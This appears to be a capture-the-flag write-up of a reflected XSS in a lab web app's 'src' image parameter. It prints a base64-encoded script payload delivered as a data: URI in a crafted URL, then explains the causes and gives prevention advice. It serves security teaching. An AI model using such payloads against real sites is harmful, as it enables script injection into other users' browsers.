# XSS (Cross-Site Scripting) Vulnerability

## Discovery Process

1. Notice an image on the main page that can be clicked
2. Click on the image and observe the URL redirect:
```
http://10.13.200.245/?page=media&src=nsa
```
3. Identified that the `src` parameter controls the image source

## Vulnerability Details

- **Issue**: The `src` parameter is not properly sanitized and allows arbitrary data URIs
- **Attack vector**: XSS using base64-encoded data URI

## Exploitation

1. Create a base64-encoded HTML payload with JavaScript using [Base64 Encode](https://www.base64encode.org/):
```javascript
// Original payload: <script>alert('test')</script>
// Base64 encoded: PHNjcmlwdD5hbGVydCgndGVzdCcpPC9zY3JpcHQ+
```

2. Replace the `src` parameter with the data URI:
```
http://10.13.200.245/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdCcpPC9zY3JpcHQ+
```

3. Navigate to the crafted URL
4. Successfully obtained the flag

## Why Does This Happen?

1. **Insufficient input validation**: The application doesn't validate or sanitize the `src` parameter
2. **Allowing data URIs**: The server accepts data: scheme URIs which can contain executable code
3. **No Content Security Policy (CSP)**: Missing CSP headers that could prevent inline scripts
4. **Reflected XSS**: User input is directly reflected in the page without encoding

## How to Prevent It

1. **Validate and sanitize input**: Whitelist allowed URL schemes (http, https only)
2. **Encode output**: HTML-encode all user input before displaying it
3. **Implement Content Security Policy**: Add CSP headers to restrict script sources
4. **Disable data URIs**: Don't allow data: scheme in src attributes
5. **Use security libraries**: Employ XSS prevention libraries like DOMPurify
